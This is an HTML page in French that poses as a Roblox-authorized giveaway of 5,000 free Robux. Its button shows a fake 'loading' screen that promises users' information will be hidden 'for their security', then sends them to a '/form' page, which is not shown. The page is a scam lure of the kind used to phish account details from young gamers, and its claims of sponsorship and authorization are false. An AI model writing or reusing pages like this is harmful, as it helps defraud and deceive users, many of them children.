<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Giveaways Robux 5k, autorise par roblox</title>
  <style>
    body {
      background: linear-gradient(135deg, #1f1f2f, #e84545);
      color: white;
      font-family: Arial, sans-serif;
      text-align: center;
      padding-top: 100px;
    }
    h1 {
      font-weight: bold;
      font-size: 2.5em;
    }
    button {
      margin-top: 50px;
      padding: 15px 30px;
      font-size: 1.2em;
      background-color: #00adb5;
      color: white;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      transition: transform 0.3s ease;
    }
    button:hover {
      transform: scale(1.05);
    }
    #loadingScreen {
      display: none;
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: black;
      color: white;
      font-size: 2em;
      justify-content: center;
      align-items: center;
      z-index: 9999;
    }
  </style>
</head>
<body>
  <h1>Robux Giveaways Sponsorisé</h1>
  <button onclick="lancer()">Recevoir les Robuxs (5k Robux)</button>

  <div id="loadingScreen">Chargement...<br><small>Toutes les infos seront masquées pour votre sécurité</small></div>

  <script>
    function lancer() {
      document.getElementById('loadingScreen').style.display = 'flex';
      setTimeout(() => {
        window.location.href = '/form';
      }, 3000);
    }
  </script>
</body>
</html>
